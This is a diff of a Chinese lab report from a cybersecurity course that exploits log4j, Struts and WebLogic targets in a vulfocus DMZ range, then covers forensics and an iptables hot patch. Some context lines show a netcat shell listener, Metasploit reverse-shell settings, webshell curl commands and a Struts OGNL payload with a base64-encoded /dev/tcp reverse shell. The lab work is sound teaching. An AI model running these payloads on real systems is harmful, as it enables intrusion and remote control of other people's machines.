@@ -1,6 +1,6 @@
 # 2024 夏网络空间安全综合实践-实验报告
 
-## 环境
+## 1. 环境
 
 - `VirtualBox` Version 7.0.10 r158379 (Qt5.15.3)
 - `Kali-Attacker`:
@@ -10,9 +10,9 @@
   - `22.04.3 LTS (Jammy Jellyfish)`
   - `hostname`: `ubuntu-victim.mlab`
 
-## 拉取 docker 镜像
+## 2. 拉取 docker 镜像
 
-### 网络配置
+### 2.1 网络配置
 
 由于目前（2024 年 7 月）国内无法正常访问 docker 及其国内镜像
 
@@ -58,7 +58,7 @@ docker pull vulfocus/vulfocus:latest
 
 ![](.assets_img/README/docker_pull.png)
 
-### 原理解释
+### 2.2 原理解释
 
 在 `VirtualBox` 的 NAT 模式下的拓扑图如下：
 
@@ -68,7 +68,7 @@ docker pull vulfocus/vulfocus:latest
 
 这完全是一个 `软件定义网络`，而且 `Virtualbox` 在 `NAT` 模式下，除了进行传统的 `NAT` 服务外，还有一个 _便捷功能_ ——将直接访问 `网关 10.0.2.2` 的流量转发到 `宿主机` 的 `localhost回环网卡` 中。
 
-## 启动 vulfocus 容器
+## 3. 启动 vulfocus 容器
 
 安装 `jq` 使得 `start.sh` 脚本能够解析 `json` 文件
 
@@ -86,9 +86,9 @@ sudo apt update && sudo apt install jq
 
 ![](.assets_img/README/vulfocus_web.png)
 
-## 漏洞利用
+## 4. 漏洞利用
 
-### JNDI 注入利用工具
+### 4.1 JNDI 注入利用工具
 
 ```bash
 wget https://github.com/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip  # 下载
@@ -104,13 +104,13 @@ unzip JNDIExploit.v1.2.zip  # 解压
 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i kali-attacker.mlab  # 运行
 ```
 
-### 攻击者监听 7777 准备接收 shell
+### 4.2 攻击者监听 7777 准备接收 shell
 
 ```bash
 nc -l -p 7777
 ```
 
-### 受害者环境配置
+### 4.3 受害者环境配置
 
 由于直接在 `vulfocus` 中启动 `漏洞环境镜像` 默认 30 分钟后销毁，且由于其随机端口转发，不方便调试。故这里使用 `docker-compose` **直接启动** `log4j` 漏洞环境。
 
@@ -124,7 +124,7 @@ services:
       - "8080:8080" # 固定端口转发
 ```
 
-### 漏洞利用代码
+### 4.4 漏洞利用代码
 
 ```python
 """log4j2 JNDI 注入"""
@@ -165,11 +165,11 @@ print(response.request.url)
 print(response.text)
 ```
 
-### Demo
+### 4.5 Demo
 
 [![asciicast](https://asciinema.org/a/667333.svg)](https://asciinema.org/a/667333)
 
-### Debug
+### 4.6 Debug
 
 在使用以下的 `python` 脚本验证 `log4j2` 漏洞时，遇到了下面的问题：
 
@@ -265,9 +265,9 @@ response = requests.get(
 
 ![](.assets_img/README/plus_double_decode.png)
 
-## 漏洞攻防
+## 5. 漏洞环境配置
 
-### DMZ 场景
+### 5.1 DMZ 场景
 
 直接导入 [DMZ.zip](https://github.com/c4pr1c3/ctf-games/tree/master/fofapro/vulfocus) 到 `vulfocus` 会显示文件上传失败：
 
@@ -285,7 +285,7 @@ response = requests.get(
 
 导出 [DMZ_topology.zip](./resources/DMZ_topology.zip) 当前（2024 年 7 月）可用
 
-### 启动 DMZ 靶场
+### 5.2 启动 DMZ 靶场
 
 无法直接启动 `DMZ` 靶场，前端页面显示 `服务器内部错误`：
 
@@ -326,7 +326,7 @@ response = requests.get(
 
 但是即使在 `vulfocus` 这样一个即使是 **开源** 的 `漏洞集成平台`，**官方** 提供的镜像中竟然也存在着这样一个不大不小的可以称为为 “后门” 的命令——让人感慨！
 
-### 修复 `vulshare/nginx-php-flag` 镜像
+### 5.3 修复 `vulshare/nginx-php-flag` 镜像
 
 故下面在 `vulshare/nginx-php-flag` 镜像的基础上，`docker build` 一波：
 
@@ -351,7 +351,7 @@ while true; do sleep 1000; done" > /2.sh
 
 ![](.assets_img/README/docker_dmz_ps.png)
 
-### 捕获指定容器的上下行流量
+### 5.4 捕获指定容器的上下行流量
 
 `tmux` 后台挂起 `tcpdump` 抓包：
 
@@ -362,7 +362,7 @@ docker run --rm --net=container:${container_name} -v ${PWD}/tcpdump/${container_
 
 ![](.assets_img/README/tmux_container_tcpdump.png)
 
-### Metasploit 连接 PostgreSQL 问题
+### 5.5 Metasploit 连接 PostgreSQL 问题
 
 ![](.assets_img/README/db_init.png)
 
@@ -423,11 +423,11 @@ msfconsole  # 进入 Metasploit
 
 ~~滚动更新一时爽，版本冲突火葬场~~
 
-### 拓扑图
+### 5.6 拓扑图
 
 ![](.assets_img/README/new_dmz_topology_ips.png)
 
-### 攻破靶标 1
+## 6. 攻破靶标 1
 
 信息收集——>`nmap` 端口扫描并尝试识别服务：
 
@@ -450,7 +450,7 @@ set payload payload/cmd/unix/reverse_bash  # 设置 payload 为 bash 反弹 shel
 
 ![](.assets_img/README/struct2_shell.png)
 
-#### autoroute
+### 6.1 autoroute
 
 如果直接使用老师示例中的命令 `run autoroute -s 192.170.84.0/24` 会显示 `OptionValidateError The following options failed to validate`：
 
@@ -470,9 +470,9 @@ use multi/manage/autoroute
 
 ![](.assets_img/README/check_autoroute.png)
 
-### 攻破靶标 2 & 3 & 4
+## 7. 攻破靶标 2 & 3 & 4
 
-#### 探测服务
+### 7.1 探测服务
 
 ```bash
 use scanner/portscan/tcp
@@ -486,7 +486,7 @@ use scanner/portscan/tcp
 
 ![](.assets_img/README/subnet_84_services.png)
 
-#### 使用 multi/misc/weblogic_deserialize_asyncresponseservice
+### 7.2 使用 multi/misc/weblogic_deserialize_asyncresponseservice
 
 ```bash
 use multi/misc/weblogic_deserialize_asyncresponseservice
@@ -504,7 +504,7 @@ use multi/misc/weblogic_deserialize_asyncresponseservice
 
 同理，可以打下 `192.169.84.3` & `192.169.84.4` 并获取 `flag`：
 
-#### 查看当前所有肉鸡的路由表
+### 7.3 查看当前所有肉鸡的路由表
 
 查看当前所有肉鸡的路由表以尝试横向移动：
 
@@ -532,7 +532,9 @@ set SESSION 16
 
 ![](.assets_img/README/new_route_table.png)
 
-#### 扫描 `192.169.86.0/24`
+## 8. 攻破靶标 5
+
+### 8.1 扫描 `192.169.86.0/24`
 
 ```bash
 use scanner/portscan/tcp
@@ -546,7 +548,7 @@ use scanner/portscan/tcp
 
 发现 `192.169.86.3:80` 中有服务：
 
-#### 攻下 `192.169.86.3`
+### 8.2 攻下 `192.169.86.3`
 
 使用代理进行访问：
 
@@ -564,11 +566,11 @@ curl "192.169.86.3:80/index.php?cmd=ls+/tmp" -x socks5://127.0.0.1:1080; echo ''
 
 ![](.assets_img/README/get_flag.png)
 
-## 入侵取证
+## 9. 入侵取证
 
 `tcpdump` 抓包结果：[tcpdump.pcap](./resources/tcpdump.pcap)
 
-### TCP shell 重定向
+### 9.1 TCP shell 重定向
 
 由于直接使用 `TCP` 协议进行 `shell` 重定向（直接明文通信），故可以直接查看到入侵后肉鸡与攻击者之间的所有通信内容：
 
@@ -576,25 +578,25 @@ curl "192.169.86.3:80/index.php?cmd=ls+/tmp" -x socks5://127.0.0.1:1080; echo ''
 
 ![](.assets_img/README/tcp_shell.png)
 
-### Metasploit exploit 过程
+### 9.2 Metasploit exploit 过程
 
 可以看到在攻击过程中，`HTTP` 请求中包含大量的包含攻击性的 `payload`：
 
 ![](.assets_img/README/metasploit_exploit_tcpdump.png)
 
-### 扫网
+### 9.3 扫网
 
 探测服务时使用了大量的 `ICMP` 包：
 
 ![](.assets_img/README/ping_wrong_ip.png)
 
-## 威胁处置
+## 10. 威胁处置
 
 釜底抽薪，对于门户网站服务器存在的 [CVE-2020-17530](https://nvd.nist.gov/vuln/detail/CVE-2020-17530) 漏洞，`NIST` 对于 `Forced OGNL evaluation` 的修复建议均为更新 `Struts` 到 `2.5.26` 或更高的版本
 
 这里不使用更新 `Struts` 包的方式，而是使用 `热补丁` 的方式进行修复缓解漏洞利用
 
-### CVE-2020-17530 的原理
+### 10.1 CVE-2020-17530 的原理
 
 `Struts` 框架（JAVA）中在处理 `OGNL` 表达式（另一种语言）时，当此表达式可以来自于用户输入时，攻击者可以构造恶意的 `OGNL` 表达式，从而执行任意代码
 
@@ -614,7 +616,7 @@ curl "192.169.86.3:80/index.php?cmd=ls+/tmp" -x socks5://127.0.0.1:1080; echo ''
 %{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec({"bash -c {echo,YmFzaCAtYyAnMDwmMzMtO2V4ZWMgMzM8Pi9kZXYvdGNwLzE5Mi4xNjguNTYuMTYyLzQ0NDQ7c2ggPCYzMyA+JjMzIDI+JjMzJw==}|{base64,-d}|bash"}))}
 ```
 
-### 热补丁
+### 10.2 热补丁
 
 上面的 `payload` 中，要实现 `任意代码执行` 最关键同时同时也是最不可避免的部分如下：
 
@@ -637,7 +639,7 @@ iptables -I DOCKER-USER -p tcp -m string --string 'execute.exec' --algo bm  -j D
 
 [![asciicast](https://asciinema.org/a/667503.svg)](https://asciinema.org/a/667503)
 
-### Debug
+### 10.3 Debug
 
 在写 iptables 规则时，~~想当然地~~ 认为应该写在 `Filter` 表的 `INPUT` 链上：
 
